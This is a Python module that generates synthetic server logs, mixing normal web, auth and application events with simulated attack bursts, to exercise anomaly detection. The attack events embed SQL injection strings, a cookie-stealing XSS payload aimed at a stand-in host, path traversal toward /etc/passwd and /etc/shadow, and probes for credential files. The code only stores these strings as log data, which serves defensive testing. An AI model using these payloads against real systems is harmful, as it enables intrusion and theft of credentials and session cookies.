"""Synthetic log stream generator.

Emits realistic mixed traffic (normal web/auth/app activity) and periodically
launches attack scenarios (brute force, SQLi, scanning, DoS, exfiltration,
privilege escalation) so anomaly detection and alerting have real signal to
work on. Feeds everything through the standard ingestion pipeline.
"""
import asyncio
import random
from datetime import datetime

from sqlalchemy.orm import Session

from .ingest import ingest_batch

GOOD_IPS = ["192.168.1.24", "192.168.1.31", "10.0.0.15", "10.0.0.22", "172.16.0.9",
            "52.14.88.101", "34.201.11.5", "104.26.7.44"]
ATTACK_IPS = ["45.155.205.233", "185.220.101.45", "91.240.118.172", "193.32.162.94",
              "141.98.10.60", "103.97.176.12"]
PATHS = ["/", "/login", "/dashboard", "/api/v1/users", "/api/v1/orders", "/static/app.js",
         "/api/v1/reports", "/health", "/api/v1/search", "/profile", "/api/v1/inventory"]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) Safari/17.4",
       "Mozilla/5.0 (X11; Linux x86_64) Firefox/127.0", "python-requests/2.31.0", "curl/8.5.0"]
USERS = ["alice", "bob", "charlie", "svc-backup", "admin", "dpatel", "mchen"]
HOSTS = ["web-prod-01", "web-prod-02", "api-prod-01", "db-primary"]

APP_ERRORS = [
    ("ERROR", "application", "NullPointerException in OrderService.calculateTotals() at line 214"),
    ("ERROR", "database", "psycopg2.OperationalError: connection to db-primary:5432 refused"),
    ("WARNING", "application", "Redis cache latency above 250ms - circuit breaker half-open"),
    ("ERROR", "system", "Out of memory: Kill process 8123 (java) score 931 or sacrifice child"),
    ("WARNING", "system", "Disk usage on /var/log at 91% - rotation pending"),
    ("CRITICAL", "application", "Health check failed for payment-service after 3 retries"),
]

SCENARIOS = ["brute_force", "sqli", "scan", "dos", "exfil", "privesc", "xss", "traversal"]


class Simulator:
    def __init__(self):
        self.task: asyncio.Task | None = None
        self.running = False
        self.events_generated = 0
        self._scenario_queue: list[str] = []

    # ------------------------------------------------------------------ events

    def _normal_event(self) -> dict:
        r = random.random()
        if r < 0.06:
            lvl, cat, msg = random.choice(APP_ERRORS)
            return {"source": "simulator", "host": random.choice(HOSTS), "level": lvl,
                    "category": cat, "message": msg, "ip_address": None}
        if r < 0.16:
            ip = random.choice(GOOD_IPS + ATTACK_IPS)
            user = random.choice(USERS)
            ok = random.random() > 0.25
            return {"source": "simulator", "host": "auth-svc", "category": "auth",
                    "level": "INFO" if ok else "WARNING",
                    "message": (f"Accepted password for {user} from {ip} port 51022 ssh2"
                                if ok else
                                f"Failed password for {'invalid user ' if random.random() < 0.4 else ''}{user} from {ip} port {random.randint(40000, 60000)} ssh2"),
                    "ip_address": ip, "username": user}
        ip = random.choice(GOOD_IPS + ATTACK_IPS[:2])
        path = random.choice(PATHS)
        status = random.choices([200, 200, 200, 200, 301, 404, 403, 500, 503],
                                weights=[55, 55, 55, 55, 8, 6, 2, 4, 1])[0]
        return {"source": "simulator", "host": random.choice(HOSTS[:2]), "category": "web",
                "level": "INFO" if status < 400 else "WARNING",
                "message": f"GET {path} -> {status}", "ip_address": ip,
                "method": random.choice(["GET", "GET", "GET", "POST"]),
                "path": path, "status_code": status,
                "bytes_sent": random.randint(400, 90000),
                "user_agent": random.choice(UAS)}

    def _attack_event(self, scenario: str) -> dict:
        ip = random.choice(ATTACK_IPS)
        ua = "python-requests/2.31.0"
        if scenario == "brute_force":
            user = random.choice(["root", "admin", "oracle", "test", "ubuntu"])
            return {"source": "simulator", "host": "auth-svc", "category": "auth", "level": "WARNING",
                    "message": f"Failed password for {'invalid user ' if random.random() < 0.5 else ''}{user} from {ip} port {random.randint(40000, 60000)} ssh2",
                    "ip_address": ip, "username": user}
        if scenario == "sqli":
            payload = random.choice([
                "/api/v1/search?q=1' UNION SELECT username, password FROM users--",
                "/api/v1/users?id=1 OR 1=1",
                "/api/v1/orders?sort=price;DROP TABLE users--",
                "/login?u=admin'--&p=x",
                "/api/v1/search?q=1' AND SLEEP(5)--",
            ])
            return {"source": "simulator", "host": "web-prod-01", "category": "web", "level": "WARNING",
                    "message": f"GET {payload} -> 200", "ip_address": ip, "method": "GET",
                    "path": payload, "status_code": 200, "bytes_sent": random.randint(2000, 30000),
                    "user_agent": ua}
        if scenario == "xss":
            payload = random.choice([
                "/comment?text=<script>document.location='http://evil.io/?c='+document.cookie</script>",
                "/profile?name=<img src=x onerror=alert(1)>",
                "/search?q=javascript:void(0)",
            ])
            return {"source": "simulator", "host": "web-prod-01", "category": "web", "level": "WARNING",
                    "message": f"GET {payload} -> 200", "ip_address": ip, "method": "GET",
                    "path": payload, "status_code": 200, "bytes_sent": 1200, "user_agent": ua}
        if scenario == "traversal":
            payload = random.choice([
                "/download?file=../../../../etc/passwd",
                "/static?path=../../%2e%2e/%2e%2e/etc/shadow",
                "/api/v1/files?name=....//....//boot.ini",
            ])
            return {"source": "simulator", "host": "web-prod-01", "category": "web", "level": "WARNING",
                    "message": f"GET {payload} -> 403", "ip_address": ip, "method": "GET",
                    "path": payload, "status_code": 403, "bytes_sent": 300, "user_agent": ua}
        if scenario == "scan":
            probes = ["/wp-admin", "/wp-login.php", "/administrator", "/phpmyadmin", "/.env",
                      "/.git/config", "/.aws/credentials", "/backup.sql", "/admin/config.php",
                      "/api/v1/private", "/console", "/actuator/env"]
            return {"source": "simulator", "host": "web-prod-02", "category": "web", "level": "WARNING",
                    "message": f"GET {random.choice(probes)} -> 404", "ip_address": ip,
                    "method": "GET", "path": random.choice(probes), "status_code": 404,
                    "bytes_sent": 150, "user_agent": random.choice(["sqlmap/1.8", "Nikto/2.5.0", "gobuster/3.6", ua])}
        if scenario == "dos":
            return {"source": "simulator", "host": "web-prod-01", "category": "web", "level": "WARNING",
                    "message": f"GET /api/v1/search?q=burst -> 503", "ip_address": ip,
                    "method": "GET", "path": "/api/v1/search?q=burst", "status_code": 503,
                    "bytes_sent": 90, "user_agent": ua,
                    "meta": {"dst_port": random.randint(1, 65535)}}
        if scenario == "exfil":
            return {"source": "simulator", "host": "db-primary", "category": "web", "level": "ERROR",
                    "message": f"POST /api/v1/reports/export -> 200 (large dump)", "ip_address": ip,
                    "method": "POST", "path": "/api/v1/reports/export", "status_code": 200,
                    "bytes_sent": random.choice([6_200_000, 7_400_000, 5_800_000]),
                    "user_agent": ua, "username": "svc-backup"}
        if scenario == "privesc":
            user = random.choice(["bob", "charlie", "svc-backup"])
            return {"source": "simulator", "host": random.choice(HOSTS), "category": "auth", "level": "ERROR",
                    "message": random.choice([
                        f"sudo: {user} : command not permitted ; TTY=pts/0 ; PWD=/etc ; USER=root ; COMMAND=/bin/cat /etc/shadow",
                        f"su[9{random.randint(100,999)}]: (to root) Authentication failure for user {user}",
                        f"sudo: {user} : user NOT in sudoers ; TTY=pts/1 ; COMMAND=/usr/bin/id",
                    ]),
                    "ip_address": ip, "username": user}
        return self._normal_event()

    def _generate_chunk(self) -> list[dict]:
        events: list[dict] = []
        for _ in range(random.randint(1, 4)):
            events.append(self._normal_event())
        # scheduled scenario bursts
        if not self._scenario_queue and random.random() < 0.05:
            self._scenario_queue = [random.choice(SCENARIOS)] * random.randint(6, 14)
        while self._scenario_queue and random.random() < 0.65:
            events.append(self._attack_event(self._scenario_queue.pop(0)))
        return events

    # ------------------------------------------------------------------- loop

    async def _run(self, db_factory):
        self.running = True
        try:
            while self.running:
                events = self._generate_chunk()
                db: Session = db_factory()
                try:
                    result = ingest_batch(db, events, source_default="simulator")
                    self.events_generated += result["accepted"]
                finally:
                    db.close()
                await asyncio.sleep(random.uniform(1.0, 2.5))
        except asyncio.CancelledError:
            pass
        finally:
            self.running = False

    def start(self, db_factory) -> bool:
        if self.running:
            return False
        self.task = asyncio.create_task(self._run(db_factory))
        return True

    def stop(self) -> bool:
        if not self.running:
            return False
        self.running = False
        if self.task:
            self.task.cancel()
        return True


simulator = Simulator()
